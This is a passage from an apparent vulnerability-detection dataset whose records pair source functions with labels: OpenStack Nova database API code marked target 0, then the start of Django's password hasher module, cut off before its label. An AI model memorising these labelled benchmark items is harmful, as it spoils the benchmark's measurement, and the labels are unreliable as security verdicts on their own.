id, session=None):\n    \"\"\"Returns a dict describing specific instance_type\"\"\"\n    result = _instance_type_get_query(context, session=session).\\\n                    filter_by(id=id).\\\n                    first()\n\n    if not result:\n        raise exception.InstanceTypeNotFound(instance_type_id=id)\n\n    return _dict_with_extra_specs(result)\n\n\n@require_context\ndef instance_type_get_by_name(context, name, session=None):\n    \"\"\"Returns a dict describing specific instance_type\"\"\"\n    result = _instance_type_get_query(context, session=session).\\\n                    filter_by(name=name).\\\n                    first()\n\n    if not result:\n        raise exception.InstanceTypeNotFoundByName(instance_type_name=name)\n\n    return _dict_with_extra_specs(result)\n\n\n@require_context\ndef instance_type_get_by_flavor_id(context, flavor_id, session=None):\n    \"\"\"Returns a dict describing specific flavor_id\"\"\"\n    result = _instance_type_get_query(context, session=session).\\\n                    filter_by(flavorid=flavor_id).\\\n                    first()\n\n    if not result:\n        raise exception.FlavorNotFound(flavor_id=flavor_id)\n\n    return _dict_with_extra_specs(result)\n\n\n@require_admin_context\ndef instance_type_destroy(context, name):\n    \"\"\"Marks specific instance_type as deleted\"\"\"\n    session = get_session()\n    with session.begin():\n        instance_type_ref = instance_type_get_by_name(context, name,\n                                                      session=session)\n        instance_type_id = instance_type_ref['id']\n        session.query(models.InstanceTypes).\\\n                filter_by(id=instance_type_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n        session.query(models.InstanceTypeExtraSpecs).\\\n                filter_by(instance_type_id=instance_type_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n\n\n####################\n\n\n@require_admin_context\ndef cell_create(context, values):\n    cell = models.Cell()\n    cell.update(values)\n    cell.save()\n    return cell\n\n\ndef _cell_get_by_id_query(context, cell_id, session=None):\n    return model_query(context, models.Cell, session=session).\\\n                       filter_by(id=cell_id)\n\n\n@require_admin_context\ndef cell_update(context, cell_id, values):\n    cell = cell_get(context, cell_id)\n    cell.update(values)\n    cell.save()\n    return cell\n\n\n@require_admin_context\ndef cell_delete(context, cell_id):\n    session = get_session()\n    with session.begin():\n        _cell_get_by_id_query(context, cell_id, session=session).\\\n                delete()\n\n\n@require_admin_context\ndef cell_get(context, cell_id):\n    result = _cell_get_by_id_query(context, cell_id).first()\n\n    if not result:\n        raise exception.CellNotFound(cell_id=cell_id)\n\n    return result\n\n\n@require_admin_context\ndef cell_get_all(context):\n    return model_query(context, models.Cell, read_deleted=\"no\").all()\n\n\n####################\n\n\ndef _instance_metadata_get_query(context, instance_id, session=None):\n    return model_query(context, models.InstanceMetadata, session=session,\n                       read_deleted=\"no\").\\\n                    filter_by(instance_id=instance_id)\n\n\n@require_context\n@require_instance_exists\ndef instance_metadata_get(context, instance_id):\n    rows = _instance_metadata_get_query(context, instance_id).all()\n\n    result = {}\n    for row in rows:\n        result[row['key']] = row['value']\n\n    return result\n\n\n@require_context\n@require_instance_exists\ndef instance_metadata_delete(context, instance_id, key):\n    _instance_metadata_get_query(context, instance_id).\\\n        filter_by(key=key).\\\n        update({'deleted': True,\n                'deleted_at': utils.utcnow(),\n                'updated_at': literal_column('updated_at')})\n\n\n@require_context\n@require_instance_exists\ndef instance_metadata_get_item(context, instance_id, key, session=None):\n    result = _instance_metadata_get_query(\n                            context, instance_id, session=session).\\\n                    filter_by(key=key).\\\n                    first()\n\n    if not result:\n        raise exception.InstanceMetadataNotFound(metadata_key=key,\n                                                 instance_id=instance_id)\n\n    return result\n\n\n@require_context\n@require_instance_exists\ndef instance_metadata_update(context, instance_id, metadata, delete):\n    session = get_session()\n\n    # Set existing metadata to deleted if delete argument is True\n    if delete:\n        original_metadata = instance_metadata_get(context, instance_id)\n        for meta_key, meta_value in original_metadata.iteritems():\n            if meta_key not in metadata:\n                meta_ref = instance_metadata_get_item(context, instance_id,\n                                                      meta_key, session)\n                meta_ref.update({'deleted': True})\n                meta_ref.save(session=session)\n\n    meta_ref = None\n\n    # Now update all existing items with new values, or create new meta objects\n    for meta_key, meta_value in metadata.iteritems():\n\n        # update the value whether it exists or not\n        item = {\"value\": meta_value}\n\n        try:\n            meta_ref = instance_metadata_get_item(context, instance_id,\n                                                  meta_key, session)\n        except exception.InstanceMetadataNotFound, e:\n            meta_ref = models.InstanceMetadata()\n            item.update({\"key\": meta_key, \"instance_id\": instance_id})\n\n        meta_ref.update(item)\n        meta_ref.save(session=session)\n\n    return metadata\n\n\n####################\n\n\n@require_admin_context\ndef agent_build_create(context, values):\n    agent_build_ref = models.AgentBuild()\n    agent_build_ref.update(values)\n    agent_build_ref.save()\n    return agent_build_ref\n\n\n@require_admin_context\ndef agent_build_get_by_triple(context, hypervisor, os, architecture,\n                              session=None):\n    return model_query(context, models.AgentBuild, session=session,\n                       read_deleted=\"no\").\\\n                   filter_by(hypervisor=hypervisor).\\\n                   filter_by(os=os).\\\n                   filter_by(architecture=architecture).\\\n                   first()\n\n\n@require_admin_context\ndef agent_build_get_all(context):\n    return model_query(context, models.AgentBuild, read_deleted=\"no\").\\\n                   all()\n\n\n@require_admin_context\ndef agent_build_destroy(context, agent_build_id):\n    session = get_session()\n    with session.begin():\n        model_query(context, models.AgentBuild, session=session,\n                    read_deleted=\"yes\").\\\n                filter_by(id=agent_build_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n\n\n@require_admin_context\ndef agent_build_update(context, agent_build_id, values):\n    session = get_session()\n    with session.begin():\n        agent_build_ref = model_query(context, models.AgentBuild,\n                                      session=session, read_deleted=\"yes\").\\\n                   filter_by(id=agent_build_id).\\\n                   first()\n\n        agent_build_ref.update(values)\n        agent_build_ref.save(session=session)\n\n\n####################\n\n@require_context\ndef bw_usage_get_by_macs(context, macs, start_period):\n    return model_query(context, models.BandwidthUsage, read_deleted=\"yes\").\\\n                   filter(models.BandwidthUsage.mac.in_(macs)).\\\n                   filter_by(start_period=start_period).\\\n                   all()\n\n\n@require_context\ndef bw_usage_update(context,\n                    mac,\n                    start_period,\n                    bw_in, bw_out,\n                    session=None):\n    if not session:\n        session = get_session()\n\n    with session.begin():\n        bwusage = model_query(context, models.BandwidthUsage,\n                              session=session, read_deleted=\"yes\").\\\n                      filter_by(start_period=start_period).\\\n                      filter_by(mac=mac).\\\n                      first()\n\n        if not bwusage:\n            bwusage = models.BandwidthUsage()\n            bwusage.start_period = start_period\n            bwusage.mac = mac\n\n        bwusage.last_refreshed = utils.utcnow()\n        bwusage.bw_in = bw_in\n        bwusage.bw_out = bw_out\n        bwusage.save(session=session)\n\n\n####################\n\n\ndef _instance_type_extra_specs_get_query(context, instance_type_id,\n                                         session=None):\n    return model_query(context, models.InstanceTypeExtraSpecs,\n                       session=session, read_deleted=\"no\").\\\n                    filter_by(instance_type_id=instance_type_id)\n\n\n@require_context\ndef instance_type_extra_specs_get(context, instance_type_id):\n    rows = _instance_type_extra_specs_get_query(\n                            context, instance_type_id).\\\n                    all()\n\n    result = {}\n    for row in rows:\n        result[row['key']] = row['value']\n\n    return result\n\n\n@require_context\ndef instance_type_extra_specs_delete(context, instance_type_id, key):\n    _instance_type_extra_specs_get_query(\n                            context, instance_type_id).\\\n        filter_by(key=key).\\\n        update({'deleted': True,\n                'deleted_at': utils.utcnow(),\n                'updated_at': literal_column('updated_at')})\n\n\n@require_context\ndef instance_type_extra_specs_get_item(context, instance_type_id, key,\n                                       session=None):\n    result = _instance_type_extra_specs_get_query(\n                            context, instance_type_id, session=session).\\\n                    filter_by(key=key).\\\n                    first()\n\n    if not result:\n        raise exception.InstanceTypeExtraSpecsNotFound(\n                extra_specs_key=key, instance_type_id=instance_type_id)\n\n    return result\n\n\n@require_context\ndef instance_type_extra_specs_update_or_create(context, instance_type_id,\n                                               specs):\n    session = get_session()\n    spec_ref = None\n    for key, value in specs.iteritems():\n        try:\n            spec_ref = instance_type_extra_specs_get_item(\n                context, instance_type_id, key, session)\n        except exception.InstanceTypeExtraSpecsNotFound, e:\n            spec_ref = models.InstanceTypeExtraSpecs()\n        spec_ref.update({\"key\": key, \"value\": value,\n                         \"instance_type_id\": instance_type_id,\n                         \"deleted\": 0})\n        spec_ref.save(session=session)\n    return specs\n\n\n##################\n\n\n@require_admin_context\ndef volume_type_create(context, values):\n    \"\"\"Create a new instance type. In order to pass in extra specs,\n    the values dict should contain a 'extra_specs' key/value pair:\n\n    {'extra_specs' : {'k1': 'v1', 'k2': 'v2', ...}}\n\n    \"\"\"\n    session = get_session()\n    with session.begin():\n        try:\n            volume_type_get_by_name(context, values['name'], session)\n            raise exception.VolumeTypeExists(name=values['name'])\n        except exception.VolumeTypeNotFoundByName:\n            pass\n        try:\n            specs = values.get('extra_specs')\n\n            values['extra_specs'] = _metadata_refs(values.get('extra_specs'),\n                                                   models.VolumeTypeExtraSpecs)\n            volume_type_ref = models.VolumeTypes()\n            volume_type_ref.update(values)\n            volume_type_ref.save()\n        except Exception, e:\n            raise exception.DBError(e)\n        return volume_type_ref\n\n\n@require_context\ndef volume_type_get_all(context, inactive=False, filters=None):\n    \"\"\"\n    Returns a dict describing all volume_types with name as key.\n    \"\"\"\n    filters = filters or {}\n\n    read_deleted = \"yes\" if inactive else \"no\"\n    rows = model_query(context, models.VolumeTypes,\n                       read_deleted=read_deleted).\\\n                        options(joinedload('extra_specs')).\\\n                        order_by(\"name\").\\\n                        all()\n\n    # TODO(sirp): this patern of converting rows to a result with extra_specs\n    # is repeated quite a bit, might be worth creating a method for it\n    result = {}\n    for row in rows:\n        result[row['name']] = _dict_with_extra_specs(row)\n\n    return result\n\n\n@require_context\ndef volume_type_get(context, id, session=None):\n    \"\"\"Returns a dict describing specific volume_type\"\"\"\n    result = model_query(context, models.VolumeTypes, session=session).\\\n                    options(joinedload('extra_specs')).\\\n                    filter_by(id=id).\\\n                    first()\n\n    if not result:\n        raise exception.VolumeTypeNotFound(volume_type=id)\n\n    return _dict_with_extra_specs(result)\n\n\n@require_context\ndef volume_type_get_by_name(context, name, session=None):\n    \"\"\"Returns a dict describing specific volume_type\"\"\"\n    result = model_query(context, models.VolumeTypes, session=session).\\\n                    options(joinedload('extra_specs')).\\\n                    filter_by(name=name).\\\n                    first()\n\n    if not result:\n        raise exception.VolumeTypeNotFoundByName(volume_type_name=name)\n    else:\n        return _dict_with_extra_specs(result)\n\n\n@require_admin_context\ndef volume_type_destroy(context, name):\n    session = get_session()\n    with session.begin():\n        volume_type_ref = volume_type_get_by_name(context, name,\n                                                  session=session)\n        volume_type_id = volume_type_ref['id']\n        session.query(models.VolumeTypes).\\\n                filter_by(id=volume_type_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n        session.query(models.VolumeTypeExtraSpecs).\\\n                filter_by(volume_type_id=volume_type_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n\n\n####################\n\n\ndef _volume_type_extra_specs_query(context, volume_type_id, session=None):\n    return model_query(context, models.VolumeTypeExtraSpecs, session=session,\n                       read_deleted=\"no\").\\\n                    filter_by(volume_type_id=volume_type_id)\n\n\n@require_context\ndef volume_type_extra_specs_get(context, volume_type_id):\n    rows = _volume_type_extra_specs_query(context, volume_type_id).\\\n                    all()\n\n    result = {}\n    for row in rows:\n        result[row['key']] = row['value']\n\n    return result\n\n\n@require_context\ndef volume_type_extra_specs_delete(context, volume_type_id, key):\n    _volume_type_extra_specs_query(context, volume_type_id).\\\n        filter_by(key=key).\\\n        update({'deleted': True,\n                'deleted_at': utils.utcnow(),\n                'updated_at': literal_column('updated_at')})\n\n\n@require_context\ndef volume_type_extra_specs_get_item(context, volume_type_id, key,\n                                     session=None):\n    result = _volume_type_extra_specs_query(\n                                    context, volume_type_id, session=session).\\\n                    filter_by(key=key).\\\n                    first()\n\n    if not result:\n        raise exception.VolumeTypeExtraSpecsNotFound(\n                   extra_specs_key=key, volume_type_id=volume_type_id)\n\n    return result\n\n\n@require_context\ndef volume_type_extra_specs_update_or_create(context, volume_type_id,\n                                             specs):\n    session = get_session()\n    spec_ref = None\n    for key, value in specs.iteritems():\n        try:\n            spec_ref = volume_type_extra_specs_get_item(\n                context, volume_type_id, key, session)\n        except exception.VolumeTypeExtraSpecsNotFound, e:\n            spec_ref = models.VolumeTypeExtraSpecs()\n        spec_ref.update({\"key\": key, \"value\": value,\n                         \"volume_type_id\": volume_type_id,\n                         \"deleted\": 0})\n        spec_ref.save(session=session)\n    return specs\n\n\n####################\n\n\ndef s3_image_get(context, image_id):\n    \"\"\"Find local s3 image represented by the provided id\"\"\"\n    result = model_query(context, models.S3Image, read_deleted=\"yes\").\\\n                 filter_by(id=image_id).\\\n                 first()\n\n    if not result:\n        raise exception.ImageNotFound(image_id=image_id)\n\n    return result\n\n\ndef s3_image_get_by_uuid(context, image_uuid):\n    \"\"\"Find local s3 image represented by the provided uuid\"\"\"\n    result = model_query(context, models.S3Image, read_deleted=\"yes\").\\\n                 filter_by(uuid=image_uuid).\\\n                 first()\n\n    if not result:\n        raise exception.ImageNotFound(image_id=image_uuid)\n\n    return result\n\n\ndef s3_image_create(context, image_uuid):\n    \"\"\"Create local s3 image represented by provided uuid\"\"\"\n    try:\n        s3_image_ref = models.S3Image()\n        s3_image_ref.update({'uuid': image_uuid})\n        s3_image_ref.save()\n    except Exception, e:\n        raise exception.DBError(e)\n\n    return s3_image_ref\n\n\n####################\n\n\n@require_admin_context\ndef sm_backend_conf_create(context, values):\n    backend_conf = models.SMBackendConf()\n    backend_conf.update(values)\n    backend_conf.save()\n    return backend_conf\n\n\n@require_admin_context\ndef sm_backend_conf_update(context, sm_backend_id, values):\n    session = get_session()\n    with session.begin():\n        backend_conf = model_query(context, models.SMBackendConf,\n                                   session=session,\n                                   read_deleted=\"yes\").\\\n                           filter_by(id=sm_backend_id).\\\n                           first()\n\n        if not backend_conf:\n            raise exception.NotFound(\n                _(\"No backend config with id %(sm_backend_id)s\") % locals())\n\n        backend_conf.update(values)\n        backend_conf.save(session=session)\n    return backend_conf\n\n\n@require_admin_context\ndef sm_backend_conf_delete(context, sm_backend_id):\n    # FIXME(sirp): for consistency, shouldn't this just mark as deleted with\n    # `purge` actually deleting the record?\n    session = get_session()\n    with session.begin():\n        model_query(context, models.SMBackendConf, session=session,\n                    read_deleted=\"yes\").\\\n                filter_by(id=sm_backend_id).\\\n                delete()\n\n\n@require_admin_context\ndef sm_backend_conf_get(context, sm_backend_id):\n    result = model_query(context, models.SMBackendConf, read_deleted=\"yes\").\\\n                     filter_by(id=sm_backend_id).\\\n                     first()\n\n    if not result:\n        raise exception.NotFound(_(\"No backend config with id \"\n                                   \"%(sm_backend_id)s\") % locals())\n\n    return result\n\n\n@require_admin_context\ndef sm_backend_conf_get_by_sr(context, sr_uuid):\n    session = get_session()\n    return model_query(context, models.SMBackendConf, read_deleted=\"yes\").\\\n                    filter_by(sr_uuid=sr_uuid).\\\n                    first()\n\n\n@require_admin_context\ndef sm_backend_conf_get_all(context):\n    return model_query(context, models.SMBackendConf, read_deleted=\"yes\").\\\n                    all()\n\n\n####################\n\n\ndef _sm_flavor_get_query(context, sm_flavor_label, session=None):\n    return model_query(context, models.SMFlavors, session=session,\n                       read_deleted=\"yes\").\\\n                        filter_by(label=sm_flavor_label)\n\n\n@require_admin_context\ndef sm_flavor_create(context, values):\n    sm_flavor = models.SMFlavors()\n    sm_flavor.update(values)\n    sm_flavor.save()\n    return sm_flavor\n\n\n@require_admin_context\ndef sm_flavor_update(context, sm_flavor_label, values):\n    sm_flavor = sm_flavor_get(context, sm_flavor_label)\n    sm_flavor.update(values)\n    sm_flavor.save()\n    return sm_flavor\n\n\n@require_admin_context\ndef sm_flavor_delete(context, sm_flavor_label):\n    session = get_session()\n    with session.begin():\n        _sm_flavor_get_query(context, sm_flavor_label).delete()\n\n\n@require_admin_context\ndef sm_flavor_get(context, sm_flavor_label):\n    result = _sm_flavor_get_query(context, sm_flavor_label).first()\n\n    if not result:\n        raise exception.NotFound(\n                _(\"No sm_flavor called %(sm_flavor)s\") % locals())\n\n    return result\n\n\n@require_admin_context\ndef sm_flavor_get_all(context):\n    return model_query(context, models.SMFlavors, read_deleted=\"yes\").all()\n\n\n###############################\n\n\ndef _sm_volume_get_query(context, volume_id, session=None):\n    return model_query(context, models.SMVolume, session=session,\n                       read_deleted=\"yes\").\\\n                        filter_by(id=volume_id)\n\n\ndef sm_volume_create(context, values):\n    sm_volume = models.SMVolume()\n    sm_volume.update(values)\n    sm_volume.save()\n    return sm_volume\n\n\ndef sm_volume_update(context, volume_id, values):\n    sm_volume = sm_volume_get(context, volume_id)\n    sm_volume.update(values)\n    sm_volume.save()\n    return sm_volume\n\n\ndef sm_volume_delete(context, volume_id):\n    session = get_session()\n    with session.begin():\n        _sm_volume_get_query(context, volume_id, session=session).delete()\n\n\ndef sm_volume_get(context, volume_id):\n    result = _sm_volume_get_query(context, volume_id).first()\n\n    if not result:\n        raise exception.NotFound(\n                _(\"No sm_volume with id %(volume_id)s\") % locals())\n\n    return result\n\n\ndef sm_volume_get_all(context):\n    return model_query(context, models.SMVolume, read_deleted=\"yes\").all()\n\n\n################\n\n\ndef _aggregate_get_query(context, model_class, id_field, id,\n                         session=None, read_deleted=None):\n    return model_query(context, model_class, session=session,\n                       read_deleted=read_deleted).filter(id_field == id)\n\n\n@require_admin_context\ndef aggregate_create(context, values, metadata=None):\n    session = get_session()\n    aggregate = _aggregate_get_query(context,\n                                     models.Aggregate,\n                                     models.Aggregate.name,\n                                     values['name'],\n                                     session=session,\n                                     read_deleted='yes').first()\n    values.setdefault('operational_state', aggregate_states.CREATED)\n    if not aggregate:\n        aggregate = models.Aggregate()\n        aggregate.update(values)\n        aggregate.save(session=session)\n    elif aggregate.deleted:\n        values['deleted'] = False\n        values['deleted_at'] = None\n        aggregate.update(values)\n        aggregate.save(session=session)\n    else:\n        raise exception.AggregateNameExists(aggregate_name=values['name'])\n    if metadata:\n        aggregate_metadata_add(context, aggregate.id, metadata)\n    return aggregate\n\n\n@require_admin_context\ndef aggregate_get(context, aggregate_id):\n    aggregate = _aggregate_get_query(context,\n                                     models.Aggregate,\n                                     models.Aggregate.id,\n                                     aggregate_id).first()\n\n    if not aggregate:\n        raise exception.AggregateNotFound(aggregate_id=aggregate_id)\n\n    return aggregate\n\n\n@require_admin_context\ndef aggregate_get_by_host(context, host):\n    aggregate_host = _aggregate_get_query(context,\n                                          models.AggregateHost,\n                                          models.AggregateHost.host,\n                                          host).first()\n\n    if not aggregate_host:\n        raise exception.AggregateHostNotFound(host=host)\n\n    return aggregate_get(context, aggregate_host.aggregate_id)\n\n\n@require_admin_context\ndef aggregate_update(context, aggregate_id, values):\n    session = get_session()\n    aggregate = _aggregate_get_query(context,\n                                     models.Aggregate,\n                                     models.Aggregate.id,\n                                     aggregate_id,\n                                     session=session).first()\n    if aggregate:\n        metadata = values.get('metadata')\n        if metadata is not None:\n            aggregate_metadata_add(context,\n                                   aggregate_id,\n                                   values.pop('metadata'),\n                                   set_delete=True)\n        with session.begin():\n            aggregate.update(values)\n            aggregate.save(session=session)\n        values['metadata'] = metadata\n        return aggregate\n    else:\n        raise exception.AggregateNotFound(aggregate_id=aggregate_id)\n\n\n@require_admin_context\ndef aggregate_delete(context, aggregate_id):\n    query = _aggregate_get_query(context,\n                                 models.Aggregate,\n                                 models.Aggregate.id,\n                                 aggregate_id)\n    if query.first():\n        query.update({'deleted': True,\n                      'deleted_at': utils.utcnow(),\n                      'operational_state': aggregate_states.DISMISSED,\n                      'updated_at': literal_column('updated_at')})\n    else:\n        raise exception.AggregateNotFound(aggregate_id=aggregate_id)\n\n\n@require_admin_context\ndef aggregate_get_all(context):\n    return model_query(context, models.Aggregate).all()\n\n\n@require_admin_context\n@require_aggregate_exists\ndef aggregate_metadata_get(context, aggregate_id):\n    rows = model_query(context,\n                       models.AggregateMetadata).\\\n                       filter_by(aggregate_id=aggregate_id).all()\n\n    return dict([(r['key'], r['value']) for r in rows])\n\n\n@require_admin_context\n@require_aggregate_exists\ndef aggregate_metadata_delete(context, aggregate_id, key):\n    query = _aggregate_get_query(context,\n                                 models.AggregateMetadata,\n                                 models.AggregateMetadata.aggregate_id,\n                                 aggregate_id).\\\n                                 filter_by(key=key)\n    if query.first():\n        query.update({'deleted': True,\n                      'deleted_at': utils.utcnow(),\n                      'updated_at': literal_column('updated_at')})\n    else:\n        raise exception.AggregateMetadataNotFound(aggregate_id=aggregate_id,\n                                                  metadata_key=key)\n\n\n@require_admin_context\n@require_aggregate_exists\ndef aggregate_metadata_get_item(context, aggregate_id, key, session=None):\n    result = _aggregate_get_query(context,\n                                  models.AggregateMetadata,\n                                  models.AggregateMetadata.aggregate_id,\n                                  aggregate_id, session=session,\n                                  read_deleted='yes').\\\n                                  filter_by(key=key).first()\n\n    if not result:\n        raise exception.AggregateMetadataNotFound(metadata_key=key,\n                                                 aggregate_id=aggregate_id)\n\n    return result\n\n\n@require_admin_context\n@require_aggregate_exists\ndef aggregate_metadata_add(context, aggregate_id, metadata, set_delete=False):\n    session = get_session()\n\n    if set_delete:\n        original_metadata = aggregate_metadata_get(context, aggregate_id)\n        for meta_key, meta_value in original_metadata.iteritems():\n            if meta_key not in metadata:\n                meta_ref = aggregate_metadata_get_item(context, aggregate_id,\n                                                      meta_key, session)\n                meta_ref.update({'deleted': True})\n                meta_ref.save(session=session)\n\n    meta_ref = None\n\n    for meta_key, meta_value in metadata.iteritems():\n        item = {\"value\": meta_value}\n        try:\n            meta_ref = aggregate_metadata_get_item(context, aggregate_id,\n                                                  meta_key, session)\n            if meta_ref.deleted:\n                item.update({'deleted': False, 'deleted_at': None})\n        except exception.AggregateMetadataNotFound:\n            meta_ref = models.AggregateMetadata()\n            item.update({\"key\": meta_key, \"aggregate_id\": aggregate_id})\n\n        meta_ref.update(item)\n        meta_ref.save(session=session)\n\n    return metadata\n\n\n@require_admin_context\n@require_aggregate_exists\ndef aggregate_host_get_all(context, aggregate_id):\n    rows = model_query(context,\n                       models.AggregateHost).\\\n                       filter_by(aggregate_id=aggregate_id).all()\n\n    return [r.host for r in rows]\n\n\n@require_admin_context\n@require_aggregate_exists\ndef aggregate_host_delete(context, aggregate_id, host):\n    query = _aggregate_get_query(context,\n                                 models.AggregateHost,\n                                 models.AggregateHost.aggregate_id,\n                                 aggregate_id).filter_by(host=host)\n    if query.first():\n        query.update({'deleted': True,\n                      'deleted_at': utils.utcnow(),\n                      'updated_at': literal_column('updated_at')})\n    else:\n        raise exception.AggregateHostNotFound(aggregate_id=aggregate_id,\n                                              host=host)\n\n\n@require_admin_context\n@require_aggregate_exists\ndef aggregate_host_add(context, aggregate_id, host):\n    session = get_session()\n    host_ref = _aggregate_get_query(context,\n                                    models.AggregateHost,\n                                    models.AggregateHost.aggregate_id,\n                                    aggregate_id,\n                                    session=session,\n                                    read_deleted='yes').\\\n                                    filter_by(host=host).first()\n    if not host_ref:\n        try:\n            host_ref = models.AggregateHost()\n            values = {\"host\": host, \"aggregate_id\": aggregate_id, }\n            host_ref.update(values)\n            host_ref.save(session=session)\n        except exception.DBError:\n            raise exception.AggregateHostConflict(host=host)\n    elif host_ref.deleted:\n        host_ref.update({'deleted': False, 'deleted_at': None})\n        host_ref.save(session=session)\n    else:\n        raise exception.AggregateHostExists(host=host,\n                                            aggregate_id=aggregate_id)\n    return host_ref\n\n\n################\n\n\ndef instance_fault_create(context, values):\n    \"\"\"Create a new InstanceFault.\"\"\"\n    fault_ref = models.InstanceFault()\n    fault_ref.update(values)\n    fault_ref.save()\n    return dict(fault_ref.iteritems())\n\n\ndef instance_fault_get_by_instance_uuids(context, instance_uuids):\n    \"\"\"Get all instance faults for the provided instance_uuids.\"\"\"\n    rows = model_query(context, models.InstanceFault, read_deleted='no').\\\n                       filter(models.InstanceFault.instance_uuid.in_(\n                           instance_uuids)).\\\n                       order_by(desc(\"created_at\")).\\\n                       all()\n\n    output = {}\n    for instance_uuid in instance_uuids:\n        output[instance_uuid] = []\n\n    for row in rows:\n        data = dict(row.iteritems())\n        output[row['instance_uuid']].append(data)\n\n    return output\n", "target": 0}
{"idx": 1019, "func": "from __future__ import unicode_literals\n\nimport base64\nimport binascii\nimport hashlib\nimport importlib\nfrom collections import OrderedDict\n\nfrom django.conf import settings\nfrom django.core.exceptions import ImproperlyConfigured\nfrom django.core.signals import setting_changed\nfrom django.dispatch import receiver\nfrom django.utils import lru_cache\nfrom django.utils.crypto import (\n    constant_time_compare, get_random_string, pbkdf2,\n)\nfrom django.utils.encoding import force_bytes, force_str, force_text\nfrom django.utils.module_loading import import_string\nfrom django.utils.translation import ugettext_noop as _\n\nUNUSABLE_PASSWORD_PREFIX = '!'  # This will never be a valid encoded hash\nUNUSABLE_PASSWORD_SUFFIX_LENGTH = 40  # number of random chars to add after UNUSABLE_PASSWORD_PREFIX\n\n\ndef is_password_usable(encoded):\n    if encoded is None or encoded.startswith(UNUSABLE_PASSWORD_PREFIX):\n        return False\n    try:\n        identify_hasher(encoded)\n    except ValueError:\n        return False\n    return True\n\n\ndef check_password(password, encoded, setter=None, preferred='default'):\n    \"\"\"\n    Returns a boolean of whether the raw password matches the three\n    part encoded digest.\n\n    If setter is specified, it'll be called when you need to\n    regenerate the password.\n    \"\"\"\n    if password is None or not is_password_usable(encoded):\n        return False\n\n    preferred = get_hasher(preferred)\n    hasher = identify_hasher(encoded)\n\n    must_update = hasher.algorithm != preferred.algorithm\n    if not must_update:\n        must_update = preferred.must_update(encoded)\n    is_correct = hasher.verify(password, encoded)\n    if setter and is_correct and must_update:\n        setter(password)\n    return is_correct\n\n\ndef make_password(password, salt=None, hasher='default'):\n    \"\"\"\n    Turn a plain-text password into a hash for database storage\n\n    Same as encode() but generates a new random salt.\n    If password is None then a concatenation of\n    UNUSABLE_PASSWORD_PREFIX and a random string will be returned\n    which disallows logins. Additional random string reduces chances\n    of gaining access to staff or superuser accounts.\n    See ticket #20079 for more info.\n    \"\"\"\n    if password is None:\n        return UNUSABLE_PASSWORD_PREFIX + get_random_string(UNUSABLE_PASSWORD_SUFFIX_LENGTH)\n    hasher = get_hasher(hasher)\n\n    if not salt:\n        salt = hasher.salt()\n\n    return hasher.encode(password, salt)\n\n\n@lru_cache.lru_cache()\ndef get_hashers():\n    hashers = []\n    for hasher_path in settings.PASSWORD_HASHERS:\n        hasher_cls = import_string(hasher_path)\n        hasher = hasher_cls()\n        if not getattr(hasher, 'algorithm'):\n            raise ImproperlyConfigured(\"hasher doesn't specify an \"\n                                       \"algorithm name: %s\" % hasher_path)\n        hashers.append(hasher)\n    return hashers\n\n\n@lru_cache.lru_cache()\ndef get_hashers_by_algorithm():\n    return {hasher.algorithm: hasher for hasher in get_hashers()}\n\n\n@receiver(setting_changed)\ndef reset_hashers(**kwargs):\n    if kwargs['setting'] == 'PASSWORD_HASHERS':\n        get_hashers.cache_clear()\n        get_hashers_by_algorithm.cache_clear()\n\n\ndef get_hasher(algorithm='default'):\n    \"\"\"\n    Returns an instance of a loaded password hasher.\n\n    If algorithm is 'default', the default hasher will be returned.\n    This function will also lazy import hashers specified in your\n    settings file if needed.\n    \"\"\"\n    if hasattr(algorithm, 'algorithm'):\n        return algorithm\n\n    elif algorithm == 'default':\n        return get_hashers()[0]\n\n    else:\n        hashers = get_hashers_by_algorithm()\n        try:\n            return hashers[algorithm]\n        except KeyError:\n            raise ValueError(\"Unknown password hashing algorithm '%s'. \"\n                             \"Did you specify it in the PASSWORD_HASHERS \"\n                             \"setting?\" % algorithm)\n\n\ndef identify_hasher(encoded):\n    \"\"\"\n    Returns an instance of a loaded password hasher.\n\n    Identifies hasher algorithm by examining encoded hash, and calls\n    get_hasher() to return hasher. Raises ValueError if\n    algorithm cannot be identified, or if hasher is not loaded.\n    \"\"\"\n    # Ancient versions of Django created plain MD5 passwords and accepted\n    # MD5 passwords with an empty salt.\n    if ((len(encoded) == 32 and '$' not in encoded) or\n            (len(encoded) == 37 and encoded.startswith('md5$$'))):\n        algorithm = 'unsalted_md5'\n    # Ancient versions of Django accepted SHA1 passwords with an empty salt.\n    elif len(encoded) == 46 and encoded.startswith('sha1$$'):\n        algorithm = 'unsalted_sha1'\n    else:\n        algorithm = encoded.split('$', 1)[0]\n    return get_hasher(algorithm)\n\n\ndef mask_hash(hash, show=6, char=\"*\"):\n    \"\"\"\n    Returns the given hash, with only the first ``show`` number shown. The\n    rest are masked with ``char`` for security reasons.\n    \"\"\"\n    masked = hash[:show]\n    masked += char * len(hash[show:])\n    return masked\n\n\nclass BasePasswordHasher(object):\n    \"\"\"\n    Abstract base class for password hashers\n\n    When creating your own hasher, you need to override algorithm,\n    verify(), encode() and safe_summary().\n\n    PasswordHasher objects are immutable.\n    \"\"\"\n    algorithm = None\n    library = None\n\n    def _load_library(self):\n        if self.library is not None:\n            if isinstance(self.library, (tuple, list)):\n                name, mod_path = self.library\n            else:\n                mod_path = self.library\n            try:\n                module = importlib.import_module(mod_path)\n            except ImportError as e:\n                raise ValueError(\"Couldn't load %r algorithm library: %s\" %\n                                 (self.__class__.__name__, e))\n            return module\n        raise ValueError(\"Hasher %r doesn't specify a library attribute\" %\n                         self.__class__.__name__)\n\n    def salt(self):\n        \"\"\"\n        Generates a cryptographically secure nonce salt in ASCII\n        \"\"\"\n        return get_random_string()\n\n    def verify(self, password, encoded):\n        \"\"\"\n        Checks if the given password is correct\n        \"\"\"\n        raise NotImplementedError('subclasses of BasePasswordHasher must provide a verify() method')\n\n    def encode(self, password, salt):\n        \"\"\"\n        Creates an encoded database value\n\n        The result is normally formatted as \"algorithm$salt$hash\" and\n        must be fewer than 128 characters.\n        \"\"\"\n        raise NotImplementedError('subclasses of 